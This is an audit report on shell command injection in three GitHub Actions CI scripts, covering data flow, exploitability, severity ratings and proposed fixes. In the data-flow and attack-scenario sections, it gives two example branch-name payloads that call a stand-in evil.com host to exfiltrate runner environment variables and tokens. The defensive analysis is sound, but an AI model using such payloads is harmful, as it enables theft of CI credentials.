# CI Command Injection Analysis

**Date:** 2026-04-11
**Analyzer:** Static analysis + manual code review
**Branch:** basic-static-analysis
**Classification:** CWE-78 (OS Command Injection)

---

## Summary

Three Python scripts used in GitHub Actions CI pipelines construct shell commands
by interpolating external data into strings that are then executed via
`subprocess.check_call(shell=True)`, `os.system()`, or `os.popen()`. This creates
potential command injection vectors. However, the exploitability of each vector
varies significantly depending on the trigger context, data source, and available
permissions.

---

## Affected Files

| File | Mechanism | Lines | Severity |
|------|-----------|-------|----------|
| `.github/scripts/import_subrepo_prs.py` | `subprocess.check_call(shell=True)` | 7-9, 68 | Medium-High |
| `.github/scripts/pr_category_label.py` | `os.system()` / `os.popen()` | 91-97 | Low |
| `.github/scripts/pr_detect_changed_subtrees.py` | `os.system()` / `os.popen()` | 115-121 | Low |

---

## Code Analysis

### File 1: `.github/scripts/import_subrepo_prs.py`

#### Vulnerable Function

The `run()` helper at lines 7-9 executes arbitrary shell commands:

```python
# Lines 7-9
def run(cmd, **kwargs):
    print(f">> {cmd}")
    subprocess.check_call(cmd, shell=True, **kwargs)
```

#### Data Flow

The most concerning call site is line 68:

```python
# Lines 48-68
pr = sub_repo.get_pull(int(pr_num))

title    = pr.title        # attacker-controlled
body     = pr.body or ""   # attacker-controlled
head_ref = pr.head.ref     # attacker-controlled (branch name)
head_url = pr.head.repo.clone_url  # attacker-controlled (fork URL)
...
run(f"git subtree pull --prefix={prefix} {head_url} {head_ref}")
```

**Data flow path:**
1. `pr_num` comes from the `PR_LIST` env var (workflow input).
2. `sub_repo.get_pull(int(pr_num))` fetches the PR from the upstream subrepo.
3. `pr.head.ref` is the branch name on the source fork -- this is set by whoever
   opened the PR in the subrepo.
4. `pr.head.repo.clone_url` is the clone URL of the fork.
5. Both values are interpolated directly into a shell command string with no
   sanitization.

A malicious branch name like `main; curl http://evil.com/exfil?t=$(cat /proc/self/environ)` would
be interpreted by the shell, executing arbitrary commands.

Additional shell-interpolated values in this file:

```python
# Line 39 - target from env var (workflow input, less risky)
run(f"git fetch origin {target}")

# Line 41
run(f"git checkout {target}")

# Line 62 - branch is derived from subrepo + pr_num (partially controlled)
run(f"git checkout -b {branch}")

# Line 77
run(f"git push origin {branch}")
```

The `target` variable comes from the workflow dispatch input `super-repo-target-branch`
(default: "develop") and is controllable only by users who can trigger the workflow.

#### Calling Workflow

**File:** `.github/workflows/import_pr_list.yml`

- **Trigger:** `workflow_dispatch` only (manual trigger)
- **Who can trigger:** Only users with write access to the repository
- **Permissions granted:**
  ```yaml
  permissions:
    contents: write
    pull-requests: write
  ```
- **Secrets available:** `APP_ID`, `APP_PRIVATE_KEY` (GitHub App credentials),
  plus the generated App token passed as `GITHUB_TOKEN`
- **Key detail:** The script fetches PR metadata from the *subrepo* (e.g., ROCm/rocBLAS).
  If the subrepo PR was opened from an external fork, the `head_ref` and `head_url`
  are attacker-controlled.

---

### File 2: `.github/scripts/pr_category_label.py`

#### Vulnerable Code

Lines 91-97 contain a fallback path that uses `os.popen()` and `os.system()`:

```python
# Lines 90-98
try:
    pr_data = os.popen(f"gh api repos/{args.repo}/pulls/{args.pr}").read()
    pr = json.loads(pr_data)
    base_sha = pr["base"]["sha"]
    head_sha = pr["head"]["sha"]
    logger.debug(f"Base SHA: {base_sha}, Head SHA: {head_sha}")
    os.system(f"git fetch origin {base_sha} {head_sha}")
    result = os.popen(f"git diff --name-only {base_sha} {head_sha}").read()
```

#### Data Flow

1. `args.repo` and `args.pr` come from command-line arguments, which are set by
   the workflow using `${{ github.repository }}` and
   `${{ github.event.pull_request.number }}`.
2. These are GitHub-controlled values -- `github.repository` is always `owner/repo`
   format and `github.event.pull_request.number` is always an integer.
3. `base_sha` and `head_sha` are extracted from the GitHub API response. These are
   40-character hex SHA strings returned by GitHub's API.
4. The SHAs are interpolated into `os.system()` and `os.popen()` calls.

**Key observation:** The SHAs come from the GitHub API (trusted source), not from
user-controlled PR metadata. A SHA is a 40-character hex string (`[0-9a-f]{40}`).
While there is no explicit validation of the SHA format, GitHub's API will always
return valid SHAs. An attacker cannot control the SHA values returned by
`gh api repos/{repo}/pulls/{pr}`.

#### Calling Workflow

**No workflow currently calls this script.** A search for `pr_category_label` in
`.github/workflows/` returned no results. The script exists but appears unused in
CI at this time.

---

### File 3: `.github/scripts/pr_detect_changed_subtrees.py`

#### Vulnerable Code

Lines 114-122 contain an identical fallback pattern:

```python
# Lines 114-122
try:
    pr_data = os.popen(f"gh api repos/{args.repo}/pulls/{args.pr}").read()
    pr = json.loads(pr_data)
    base_sha = pr["base"]["sha"]
    head_sha = pr["head"]["sha"]
    logger.debug(f"Base SHA: {base_sha}, Head SHA: {head_sha}")
    os.system(f"git fetch origin {base_sha} {head_sha}")
    result = os.popen(f"git diff --name-only {base_sha} {head_sha}").read()
```

#### Data Flow

Identical to File 2. The interpolated values are:
- `args.repo`: from `${{ github.repository }}` -- GitHub-controlled, safe
- `args.pr`: from `${{ github.event.pull_request.number }}` -- integer, safe
- `base_sha` / `head_sha`: from GitHub API response -- hex SHA strings, safe

#### Calling Workflows

This script is called from four workflows:

1. **`therock-ci.yml`** -- triggered on `pull_request` (opened, synchronize, reopened)
   and `push` to develop. Permissions: `contents: read` only. External contributors
   can trigger this via PR. Uses `${{ github.token }}` (limited, auto-generated).

2. **`pre-formatting.yml`** -- triggered on `pull_request` to `testbranch` only.
   No explicit permissions block (defaults apply). Uses `${{ secrets.GITHUB_TOKEN }}`.

3. **`pr-merge-sync-patches.yml`** -- triggered on `push` to `develop` only.
   No explicit permissions block. Only runs for merged PRs. External contributors
   cannot directly trigger this.

4. **`pr-merge-sync-patches-manual.yml`** -- triggered via `workflow_dispatch`.
   Validates that the caller has `admin` or `maintain` permission before proceeding.

---

## Exploitability Assessment

### import_subrepo_prs.py -- The Real Risk

**Can external contributors trigger this?** No. The workflow uses `workflow_dispatch`,
which requires write access to the repository. Only maintainers/collaborators can
trigger it.

**But the input data is externally controlled.** Here is the critical nuance: a
maintainer selects a subrepo PR number to import. If that subrepo PR was opened by
an external contributor from a fork, then the `head_ref` (branch name) and
`head_url` (clone URL) are attacker-controlled. The maintainer importing the PR
may not realize the branch name contains shell metacharacters.

**Attack scenario:**
1. Attacker opens a PR in the subrepo (e.g., ROCm/rocBLAS) from a fork.
2. The fork branch name contains shell injection payload:
   `fix-bug$(curl http://evil.com/steal?t=$(cat /proc/self/environ | base64 -w0))`
3. A maintainer of the super-repo runs the "Import Subrepo PRs" workflow,
   specifying the attacker's PR number.
4. The script fetches the PR metadata and executes:
   `git subtree pull --prefix=projects/rocblas https://github.com/attacker/rocBLAS.git fix-bug$(curl ...)`
5. The shell interprets the `$(...)` substitution, exfiltrating environment
   variables including `GITHUB_TOKEN` (the App token with write access).

**Secrets at risk:**
- GitHub App token (generated from `APP_ID` + `APP_PRIVATE_KEY`) with `contents: write`
  and `pull-requests: write` scopes on the repository owner's repos
- Any other environment variables present in the runner

**Mitigating factors:**
- Requires a maintainer to manually trigger the workflow
- A maintainer *choosing* which PR to import provides a human review gate
- However, maintainers are unlikely to inspect branch names for shell metacharacters
- The branch name appears in the workflow logs, but the command executes before
  anyone would review logs

**Real-world precedent:** Yes. GitHub Actions command injection via `shell=True`
and unsanitized PR metadata is a well-documented vulnerability class. See:
- [GitHub Security Lab: Keeping your GitHub Actions and workflows secure](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)
- Multiple CVEs in open-source CI pipelines (e.g., CVE-2022-35954, various
  ArtiPACKED findings)

### pr_category_label.py and pr_detect_changed_subtrees.py -- Low Risk

**The `os.system()` / `os.popen()` usage is poor practice but not exploitable
in the current context:**

1. The interpolated values (`args.repo`, `args.pr`) come from GitHub context
   expressions that are tightly constrained (repo name format, integer PR number).
2. The SHA values come from the GitHub API and are always 40-hex-character strings.
3. This fallback code only runs when the primary API-based file detection fails.
4. There is no path where attacker-controlled free-text (like branch names, PR
   titles, or commit messages) reaches these shell commands.

**However, these are still code quality issues:**
- Using `os.system()` and `os.popen()` is deprecated/discouraged
- If the code is refactored and new interpolated values are added, the shell
  injection surface would expand
- The pattern sets a bad precedent for the codebase

---

## Proposed Fix

### Fix for `import_subrepo_prs.py`

Replace `shell=True` with a safe argument list approach:

```python
import shlex
import subprocess

def run(cmd, **kwargs):
    """Run a shell command safely.

    If cmd is a string, it is split using shlex.split() and executed
    without a shell, preventing injection via metacharacters.
    If cmd is already a list, it is passed through directly.
    """
    if isinstance(cmd, str):
        args = shlex.split(cmd)
    else:
        args = cmd
    print(f">> {' '.join(args)}")
    subprocess.check_call(args, **kwargs)
```

Then update line 72 which uses `|| true` (shell syntax that requires shell=True):

```python
# OLD (line 72):
run(f"git merge --abort || true")

# NEW:
try:
    run("git merge --abort")
except subprocess.CalledProcessError:
    pass  # merge --abort fails if no merge in progress; that's fine
```

Alternatively, for the specific `git subtree pull` call, validate that `head_ref`
and `head_url` contain only safe characters:

```python
import re

def validate_ref(ref: str) -> str:
    """Validate a git ref name contains no shell metacharacters."""
    if not re.match(r'^[A-Za-z0-9._/\-]+$', ref):
        raise ValueError(f"Invalid ref name (possible injection): {ref!r}")
    return ref

def validate_url(url: str) -> str:
    """Validate a clone URL is a proper HTTPS GitHub URL."""
    if not re.match(r'^https://github\.com/[A-Za-z0-9._\-]+/[A-Za-z0-9._\-]+(\.git)?$', url):
        raise ValueError(f"Invalid clone URL: {url!r}")
    return url
```

### Fix for `pr_category_label.py` (lines 91-97)

Replace `os.popen()` and `os.system()` with `subprocess.run()`:

```python
# OLD:
pr_data = os.popen(f"gh api repos/{args.repo}/pulls/{args.pr}").read()
pr = json.loads(pr_data)
base_sha = pr["base"]["sha"]
head_sha = pr["head"]["sha"]
os.system(f"git fetch origin {base_sha} {head_sha}")
result = os.popen(f"git diff --name-only {base_sha} {head_sha}").read()

# NEW:
import subprocess

pr_result = subprocess.run(
    ["gh", "api", f"repos/{args.repo}/pulls/{args.pr}"],
    capture_output=True, text=True, check=True
)
pr = json.loads(pr_result.stdout)
base_sha = pr["base"]["sha"]
head_sha = pr["head"]["sha"]
logger.debug(f"Base SHA: {base_sha}, Head SHA: {head_sha}")
subprocess.run(
    ["git", "fetch", "origin", base_sha, head_sha],
    check=True
)
diff_result = subprocess.run(
    ["git", "diff", "--name-only", base_sha, head_sha],
    capture_output=True, text=True, check=True
)
changed_files = diff_result.stdout.strip().splitlines()
```

### Fix for `pr_detect_changed_subtrees.py` (lines 114-122)

Identical fix to pr_category_label.py -- replace `os.popen()` and `os.system()`
with `subprocess.run()` using argument lists (no shell):

```python
# NEW (same pattern as above):
pr_result = subprocess.run(
    ["gh", "api", f"repos/{args.repo}/pulls/{args.pr}"],
    capture_output=True, text=True, check=True
)
pr = json.loads(pr_result.stdout)
base_sha = pr["base"]["sha"]
head_sha = pr["head"]["sha"]
logger.debug(f"Base SHA: {base_sha}, Head SHA: {head_sha}")
subprocess.run(
    ["git", "fetch", "origin", base_sha, head_sha],
    check=True
)
diff_result = subprocess.run(
    ["git", "diff", "--name-only", base_sha, head_sha],
    capture_output=True, text=True, check=True
)
changed_files = diff_result.stdout.strip().splitlines()
```

---

## Real-World Severity Rating

### import_subrepo_prs.py

**Rating: Medium-High (CVSS ~6.5)**

- The vulnerability is real and the injection vector through branch names is viable.
- **However**, exploitation requires a maintainer to manually import a specific
  malicious subrepo PR. This is a significant gate.
- The secrets at risk (GitHub App token) are high-value but time-limited.
- The attack requires social engineering: the attacker must get a maintainer to
  import their PR, and the malicious branch name might be noticed in logs.
- **Recommendation: Fix this promptly.** The `shell=True` pattern is unnecessary
  and removing it is a low-effort, zero-risk change.

### pr_category_label.py and pr_detect_changed_subtrees.py

**Rating: Low (CVSS ~2.0)**

- The shell usage is poor practice but not exploitable given current data flows.
- The interpolated values (repo names, PR numbers, SHAs) are constrained by GitHub.
- No attacker-controlled free-text reaches these shell commands.
- **Recommendation: Fix as code quality improvement.** Replace `os.system()` /
  `os.popen()` with `subprocess.run()` to follow best practices and prevent
  future regressions if new interpolations are added.

### Overall Assessment

This is **not a hair-on-fire emergency** but it is a **legitimate vulnerability** in
`import_subrepo_prs.py` that should be fixed in the next development cycle. The
other two files are code quality issues, not active security risks. All three fixes
are straightforward and low-risk to implement.
